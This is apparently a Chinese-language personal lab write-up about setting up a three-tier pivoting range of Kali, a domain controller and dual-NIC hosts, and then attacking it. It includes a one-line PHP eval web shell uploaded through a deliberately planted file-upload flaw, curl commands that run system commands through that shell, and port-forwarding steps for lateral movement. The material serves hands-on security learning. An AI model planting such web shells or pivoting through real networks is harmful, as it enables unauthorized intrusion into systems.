# 搭建过程
kali使用仅主机模式的vnet1网卡 分配一个192.168.145.130的ip
域控制器DC使用仅主机模式分配192.168.145.128 ip
第一层靶机分配两个网卡
第一个网卡使用 192.168.145.129ip
第二个网卡 192.168.164.128
第二层靶机分配两个网卡
第一个使用 192.168.164.129
第二个使用 192.168.70.128
第三个靶机分配一个网卡 192.168.70.129
这个三层靶场目前不需要配置默认网关 因为实际上整个过程都是kali去主动访问第一层 第二层这样子 靶机并没有主动访问kali  响应包的时候比如第二层使用收到来自kali，但是实际上是由第一层接受后再进行端口映射，进而转发流量的，第二层并不知道流量是来自kali的 所以响应时只是把响应的流量原路返回给第一层 第一层在交给kali
路由表和默认网关的区别
路由表里记录着哪一条路最匹配目的ip，最好 决定要不要把数据包交给默认网关 实际上路由表上也记录了默认网关的地址 而默认网关是路由表上找不到匹配的项的时候才会把数据包交给默认网关

# 渗透过程
首先从第一层开始 开始知道了一个192.168.145.129的第一层靶机的一个ip地址，接着去访问80端口的web页面，然后自己设置一个简单的漏洞 这里是文件上传漏洞 一个shell.php文件 内容是<?php @eval($_GET['cmd']);?> 然后就可以直接在kali上使用curl http://192.168.145.129/upload/shell.php?cmd='whoami'这样子去执行代码和回显 然后接着就是使用ipconfig代码发现存在第二块网卡也就是164.128，然后这时候使用arp-a扫描整个网段 然后就发现网段上的某个主机会进行响应也就是164.129这个主机 这里也就成功进入第二层的渗透。配置端口转发 把流量从192.168.145.129:8888转发到第二层的192.168.164.129:80端口 然后我们去访问8888端口实际上就是访问的该靶机的80端口的web页面了 接着就是如法炮制访问到第三层的靶机 然后还是通过漏洞拿到shell
